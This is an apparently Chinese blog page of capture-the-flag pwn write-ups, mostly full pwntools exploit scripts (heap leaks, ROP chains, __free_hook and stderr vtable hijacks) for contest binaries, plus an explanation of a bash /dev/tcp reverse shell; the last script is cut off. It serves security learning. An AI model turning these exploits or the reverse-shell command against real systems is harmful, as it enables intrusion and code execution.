class="number">0x16</span>)</span><br><span class="line">    payload+=add_int_string(<span class="number">0xc0</span>,<span class="number">0x16</span>,<span class="string">&#x27;f&#x27;</span>*<span class="number">0x16</span>)</span><br><span class="line">    <span class="comment">#del</span></span><br><span class="line">    payload+=del_int_key(<span class="number">0x80</span>)</span><br><span class="line">    <span class="comment">#get</span></span><br><span class="line">    payload+=intkey_get_value(<span class="number">0x70</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    sh.recv(<span class="number">710</span>)</span><br><span class="line">    heap_base=u64(sh.recvuntil(<span class="string">&#x27;V&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">0x128e0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(heap_base))</span><br><span class="line">    <span class="comment">#add</span></span><br><span class="line">    payload=add_int_string(<span class="number">0xd0</span>,<span class="number">0x500</span>,<span class="string">&#x27;g&#x27;</span>)</span><br><span class="line">    <span class="comment">#change_value</span></span><br><span class="line">    heap_addr=heap_base+<span class="number">0x12a60</span></span><br><span class="line">    payload+=change_value(<span class="number">0xb0</span>,<span class="number">0x16</span>,p64(<span class="number">3</span>)+p64(<span class="number">0x16</span>)+p32(heap_addr&amp;<span class="number">0xffffffff</span>)+p16((heap_addr&amp;<span class="number">0xffff00000000</span>)&gt;&gt;<span class="number">8</span>*<span class="number">4</span>))</span><br><span class="line">    <span class="comment">#get</span></span><br><span class="line">    payload+=intkey_get_value(<span class="number">0xc0</span>)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line">    libc_base=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>)-<span class="number">0x1ecbe0</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    system_addr=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">    free_hook=libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]-<span class="number">0x20</span></span><br><span class="line">    pay1=<span class="string">b&#x27;cat flag &gt;&amp;4\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">13</span>)+<span class="string">b&#x27;\x00&#x27;</span>*<span class="number">0x10</span></span><br><span class="line">    payload=change_value(<span class="number">0xb0</span>,<span class="number">0x16</span>,p64(<span class="number">3</span>)+p64(<span class="number">0x30</span>)+p32(free_hook&amp;<span class="number">0xffffffff</span>)+p16((free_hook&amp;<span class="number">0xffff00000000</span>)&gt;&gt;<span class="number">8</span>*<span class="number">4</span>))</span><br><span class="line">    payload+=change_value(<span class="number">0xc0</span>,<span class="number">0x30</span>,pay1)</span><br><span class="line">    payload+=change_value(<span class="number">0xa0</span>,<span class="number">0x16</span>,p64(<span class="number">3</span>)+p64(<span class="number">0x30</span>)+p32(free_hook&amp;<span class="number">0xffffffff</span>)+p16((free_hook&amp;<span class="number">0xffff00000000</span>)&gt;&gt;<span class="number">8</span>*<span class="number">4</span>))</span><br><span class="line">    pay=<span class="string">b&#x27;cat flag &gt;&amp;4\x00&#x27;</span>+<span class="string">b&#x27;a&#x27;</span>*(<span class="number">0x20</span>-<span class="number">13</span>)+p64(system_addr)+p64(<span class="number">0</span>)</span><br><span class="line">    payload+=change_key(<span class="number">0x30</span>,pay1,<span class="number">0x30</span>,pay)</span><br><span class="line">    sh.send(payload)</span><br><span class="line"></span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<p>åå¼¹åŸç†</p>
<p>ç±»ä¼¼bashçš„åå¼¹åŸç†ï¼Œbashçš„åå¼¹å‘½ä»¤æ˜¯</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">base -i &amp;&gt; /dev/tcp/ip/port  0&gt;&amp;1</span><br></pre></td></tr></table></figure>

<p>å…¶ä¸­<code>base i</code>çš„ä½œç”¨æ˜¯äº§ç”Ÿä¸€ä¸ªbaseäº¤äº’ç¯å¢ƒï¼Œç„¶å<code>&amp;&gt;</code>ä»£è¡¨ç€æŠŠå‰é¢baseçš„äº¤äº’ç¯å¢ƒçš„æ ‡å‡†è¾“å‡ºå’Œæ ‡å‡†é”™è¯¯é‡å®šä½åˆ°åé¢çš„æ–‡ä»¶ä¸­ï¼Œç„¶ååé¢<code>0&gt;&amp;1</code>å°±æ˜¯æŠŠæ ‡å‡†è¾“å…¥é‡å®šä½åˆ°æ ‡å‡†è¾“å‡ºä¸Šï¼Œç”±äºæ ‡å‡†è¾“å‡ºæŒ‡å‘tcpè¿æ¥ï¼Œæ‰€ä»¥æ ‡å‡†è¾“å…¥ä¹Ÿé‡å®šä½åˆ°è¿™ä¸ªæ–‡ä»¶ä¸Šäº†ï¼Œè¿™æ ·å°±äº§ç”Ÿä¸€ä¸ªäº¤äº’å¼çš„baseäº†ã€‚</p>
<p>å…¶ä¸­æ¯”è¾ƒé‡è¦çš„å°±æ˜¯<code>&gt;&amp;</code>ç¬¦å·ï¼Œä»–ä¼šæŠŠå‰é¢çš„å†…å®¹é‡å®šå‘åˆ°åé¢çš„å†…å®¹ï¼Œåé¢æ˜¯ä¸ªfd,æ¯”å¦‚<code>echo flag &gt;&amp;1</code>å°±æ˜¯æŠŠflagé‡å®šå‘åˆ°äº†åˆ°äº†1å³æ ‡å‡†è¾“å‡ºï¼Œåœ¨è„šæœ¬ä¸­æˆ‘æ˜¯<code>cat flag &gt;&amp;4</code>å°±æ˜¯æŠŠflagæ–‡ä»¶çš„å†…å®¹é‡å®šå‘åˆ°äº†4å³scocketè¿æ¥ä¸Šã€‚æ‰€ä»¥ä¼šæŠŠflagå‘è¿‡æ¥ã€‚</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/04/27/TSCTF/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="rootzhang">
      <meta itemprop="description" content="æˆ‘çš„åšå®¢">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="study">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/04/27/TSCTF/" class="post-title-link" itemprop="url">TSCTF</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">å‘è¡¨äº</span>
              

              <time title="åˆ›å»ºæ—¶é—´ï¼š2022-04-27 21:13:33 / ä¿®æ”¹æ—¶é—´ï¼š21:14:13" itemprop="dateCreated datePublished" datetime="2022-04-27T21:13:33+08:00">2022-04-27</time>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="TSCTF-pwn"><a href="#TSCTF-pwn" class="headerlink" title="TSCTF pwn"></a>TSCTF pwn</h1><p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220425124307333.png" alt="image-20220425124307333"></p>
<p><img src="C:\Users\å¼ é¹\AppData\Roaming\Typora\typora-user-images\image-20220425124334437.png" alt="image-20220425124334437"></p>
<h2 id="0x1-alarm"><a href="#0x1-alarm" class="headerlink" title="0x1 alarm"></a>0x1 alarm</h2><p>ä¸»è¦æ¼æ´å‡ºç°åœ¨å †çš„ç”³è¯·ä¸Šï¼Œå¯ä»¥ç”³è¯·17ä¸ªå †ï¼Œç„¶åè¦†ç›–editå‡½æ•°çš„åç§»å€¼ï¼ŒæŠŠè¿™ä¸ªåç§»å€¼æ”¹æˆè´Ÿæ•°å°±å¯ä»¥å‘ä¸Šè¦†ç›–gotè¡¨äº†ï¼Œæˆ‘æ²¡åšå‡ºæ¥çš„ä¸»è¦åŸå› æ˜¯æˆ‘ä»¥ä¸ºè¿™ä¸ªåç§»å€¼æ˜¯å­—ç¬¦çš„è¾“å…¥ä¸ªæ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 <span class="title">sub_2AF7</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  __int16 v1; <span class="comment">// ax</span></span><br><span class="line">  __int64 v2; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = (<span class="keyword">unsigned</span> <span class="keyword">int</span>)dword_5520;</span><br><span class="line">  <span class="keyword">if</span> ( (__int16)dword_5520 &lt;= <span class="number">7</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v1 = dword_5520++;</span><br><span class="line">    v2 = <span class="built_in">std</span>::<span class="built_in">string</span>::<span class="keyword">operator</span>[](&amp;unk_53E0, v1);</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">std</span>::<span class="keyword">operator</span>&gt;&gt;&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cin</span>, v2);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åœ¨ayoungä½¬è¿™é‡Œå­¦åˆ°ä¸€ä¸ªå¾ˆå¥½ç”¨çš„gadgetæ¥ç»•è¿‡æ²™ç®±è¿›è¡Œrop</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sub    rsp, 0x18</span><br><span class="line">mov    rbp, qword ptr [rdi + 0x48]</span><br><span class="line">mov    rax, qword ptr [rbp + 0x18]</span><br><span class="line">lea    r13, [rbp + 0x10]</span><br><span class="line">mov    dword ptr [rbp + 0x10], 0</span><br><span class="line">mov    rdi, r13</span><br><span class="line">call   qword ptr [rax + 0x28]</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªgadgetçš„ä¸»è¦ä½œç”¨å°±æ˜¯é€šè¿‡rdiæ§åˆ¶rbpç„¶åå†è·³ä¸€ä¸ªleave_retå°±å¯ä»¥æ§åˆ¶rspæ¥å®Œæˆropäº†</p>
<p>è„šæœ¬</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=process([<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so&#x27;</span>, <span class="string">&#x27;./pwn&#x27;</span>], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>:<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>&#125;)</span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>(<span class="params">name,pwd</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;username: &quot;</span>)</span><br><span class="line">    sh.sendline(name)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;password: &quot;</span>)</span><br><span class="line">    sh.sendline(pwd)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;chose &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;size &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx,choice</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;chose &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;idx &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;Sure delete ?&quot;</span>)</span><br><span class="line">    sh.send(choice)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;chose &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bye</span>(<span class="params">content</span>):</span></span><br><span class="line">    sh.recvuntil(<span class="string">&quot;chose &gt; &quot;</span>)</span><br><span class="line">    sh.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;byebye, good night~\n&quot;</span>)</span><br><span class="line">    sh.send(content)</span><br><span class="line">duan=<span class="string">&quot;b *(0x7ffff7fc5000+&#123;0&#125;)&quot;</span>.<span class="built_in">format</span>(<span class="number">0x2B7D</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,duan)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    init(<span class="string">&quot;rootroot&quot;</span>,<span class="string">&quot;#$%^&amp;*!@&quot;</span>)</span><br><span class="line">    add(<span class="number">0x500</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">15</span>):</span><br><span class="line">        add(<span class="number">0x100</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    add(<span class="number">0xfcf0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    edit(<span class="string">&#x27;\xc9&#x27;</span>)</span><br><span class="line">    free(<span class="number">0</span>,<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">    free(<span class="number">1</span>,<span class="string">&#x27;s&#x27;</span>)</span><br><span class="line">    bye(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    libc_addr=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ed000</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(libc_addr)</span><br><span class="line">    free(<span class="number">1</span>,<span class="string">&#x27;Y&#x27;</span>)</span><br><span class="line">    bye(<span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line">    heap_addr=u64(sh.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x13b00</span></span><br><span class="line">    <span class="built_in">print</span> <span class="built_in">hex</span>(heap_addr)</span><br><span class="line">    add(<span class="number">0xfc60</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    heap_17_addr=<span class="number">0x24fc0</span>+heap_addr</span><br><span class="line">    <span class="comment">#0x000000000008e1c4: mov esp, eax; mov rax, r12; pop r12; ret;</span></span><br><span class="line">    gadget=libc_addr+<span class="number">0x154d06</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        content=gadget&amp;<span class="number">0xff</span></span><br><span class="line">        gadget=gadget&gt;&gt;<span class="number">8</span></span><br><span class="line">        edit(p8(content))</span><br><span class="line">    heap_rop_addr=<span class="number">0x142d0</span>+heap_addr</span><br><span class="line">    pop_rdi=<span class="number">0x0000000000023b72</span>+libc_addr</span><br><span class="line">    pop_rsi=libc_addr+<span class="number">0x000000000002604f</span></span><br><span class="line">    pop_rdx_r12=<span class="number">0x0000000000119241</span>+libc_addr</span><br><span class="line">    syscall_ret=<span class="number">0x00000000000630d9</span>+libc_addr</span><br><span class="line">    pop_rax=<span class="number">0x0000000000047400</span>+libc_addr</span><br><span class="line">    leave_ret=libc_addr+<span class="number">0x00000000000578f8</span></span><br><span class="line"></span><br><span class="line">    rop=p64(heap_rop_addr)+p64(pop_rdx_r12)</span><br><span class="line">    rop+=p64(<span class="number">0</span>)+p64(heap_rop_addr)</span><br><span class="line">    rop+=p64(pop_rdi)+p64(leave_ret)</span><br><span class="line">    rop+=p64(pop_rax)+p64(<span class="number">2</span>)</span><br><span class="line">    rop+=p64(pop_rdi)+p64(heap_rop_addr)</span><br><span class="line">    rop+=p64(pop_rdi)+p64(heap_rop_addr+<span class="number">0xe8</span>)</span><br><span class="line">    rop+=p64(pop_rsi)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(pop_rdx_r12)+p64(<span class="number">0</span>)</span><br><span class="line">    rop+=p64(<span class="number">0</span>)+p64(syscall_ret)</span><br><span class="line">    rop+=p64(pop_rdi)+p64(<span class="number">3</span>)</span><br><span class="line">    rop+=p64(pop_rsi)+p64(heap_rop_addr+<span class="number">0x200</span>)</span><br><span class="line">    rop+=p64(pop_rdx_r12)+p64(<span class="number">0x30</span>)</span><br><span class="line">    rop+=p64(<span class="number">0x30</span>)+p64(libc_addr+libc.sym[<span class="string">&quot;read&quot;</span>])</span><br><span class="line">    rop+=p64(pop_rdi)+p64(heap_rop_addr+<span class="number">0x200</span>)</span><br><span class="line">    rop+=p64(libc_addr+libc.sym[<span class="string">&quot;puts&quot;</span>])+<span class="string">&#x27;./flag\x00\x00&#x27;</span></span><br><span class="line">    bye(rop)</span><br><span class="line">    sh.interactive()</span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>

<h2 id="0x2-babynote"><a href="#0x2-babynote" class="headerlink" title="0x2 babynote"></a>0x2 babynote</h2><p>ä¸»è¦é—®é¢˜å‡ºç°åœ¨äº†æ‹·è´å‡½æ•°memcpyä¸Šï¼Œåˆ©ç”¨åŠ å¯†å‡½æ•°å’Œreadå‡½æ•°é…åˆæ¥å®Œæˆå †çš„æº¢å‡ºæ‹·è´ï¼Œç„¶åä½¿ç”¨äº†ç„¶åæŠŠstderrçš„vtableè¦†ç›–æˆ<code>io_str_jumps</code>,ä¿®æ”¹stderrç»“æ„ä½“çš„å†…å®¹ï¼Œè®©stderr+0x28å¡«ä¸Šè‡ªå·±æƒ³å¡«çš„åœ°å€ï¼Œç„¶åå…¶ä»–å…¨å¡«0ï¼Œè¿™æ ·çš„è¯ï¼Œæœ€åexitå°±ä¼šæ‰§è¡Œstderrçš„io_str_overflow,è¿™ä¸ªå‡½æ•°ä¼š<code>call malloc</code>è¿™æ—¶å€™ç¨‹åºçš„rdxæŒ‡é’ˆæ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„äº†ï¼Œå…·ä½“å’Œstderr+0x28ç›¸å…³ï¼Œç„¶åæŠŠmalloc_hookè¦†ç›–æˆsetcontextå°±å¯ä»¥æ§åˆ¶rspå®Œæˆropäº†ã€‚</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">sh=remote(<span class="string">&quot;10.7.2.133&quot;</span>,<span class="number">34789</span>)</span><br><span class="line"><span class="comment">#sh=process([&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/ld-2.31.so&#x27;, &#x27;./pwn&#x27;], env=&#123;&quot;LD_PRELOAD&quot;:&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;&#125;)</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;/home/rootzhang/glibc-all-in-one/libs/2.31-0ubuntu9.7_amd64/libc-2.31.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_note</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;content: &quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_note</span>(<span class="params">idx</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">encrype_note</span>(<span class="params">idx,key</span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;4&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sh.sendafter(<span class="string">&quot;encrypt key: &quot;</span>,key)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_note</span>(<span class="params">i,idx,key=<span class="number">0</span></span>):</span></span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sh.sendlineafter(<span class="string">&quot;index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    <span class="keyword">if</span> i==<span class="number">1</span>:</span><br><span class="line">        sh.sendafter(<span class="string">&quot;encrypt key: &quot;</span>,key)</span><br><span class="line">    </span><br><span class="line">duan=<span class="string">&quot;b *(0x7ffff7fc5000+&#123;0&#125;)&quot;</span>.<span class="built_in">format</span>(<span class="number">0x1747</span>)</span><br><span class="line"><span class="comment">#gdb.attach(sh,duan)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span>():</span></span><br><span class="line">    rand=<span class="number">0xa6381cc</span></span><br><span class="line">    pay=<span class="string">&#x27;a&#x27;</span>*(<span class="number">0xf8</span>-<span class="number">8</span>-<span class="number">3</span>)+p64(<span class="number">0x481</span>)</span><br><span class="line">    write_note(<span class="number">0xf8</span>,pay+<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">11</span>):</span><br><span class="line">        write_note(<span class="number">0x70</span>,<span class="string">&#x27;a\n&#x27;</span>)</span><br><span class="line">    key=<span class="string">&#x27;:&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    encrype_note(<span class="number">0</span>,key)</span><br><span class="line">    key=p32(rand)+<span class="string">&#x27;:&#x27;</span>.ljust(<span class="number">0xa</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">    read_note(<span class="number">1</span>,<span class="number">0</span>,key)</span><br><span class="line">    delete_note(<span class="number">1</span>)</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span class="string">&#x27;\a\n&#x27;</span>)</span><br><span class="line">    read_note(<span class="number">0</span>,<span class="number">2</span>)</span><br><span class="line">    sh.recvuntil(<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">    libc_base=u64(sh.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1ecbe0</span></span><br><span class="line">    ret=<span class="number">0x0000000000022679</span>+libc_base</span><br><span class="line">    pop_rdi=<span class="number">0x0000000000023b72</span>+libc_base</span><br><span class="line">    pop_rsi=<span class="number">0x000000000002604f</span>+libc_base</span><br><span class="line">    pop_rdx_r12=<span class="number">0x0000000000119241</span>+libc_base</span><br><span class="line">    syscall_ret=<span class="number">0x00000000000630d9</span>+libc_base</span><br><span class="line">    pop_rax=<span class="number">0x0000000000047400</span>+libc_base</span><br><span class="line">    add_rsp_0x20_pop_rdx=<span class="number">0x0000000000042b71</span>+libc_base</span><br><span class="line">    write_note(<span class="number">0x70</span>,<span 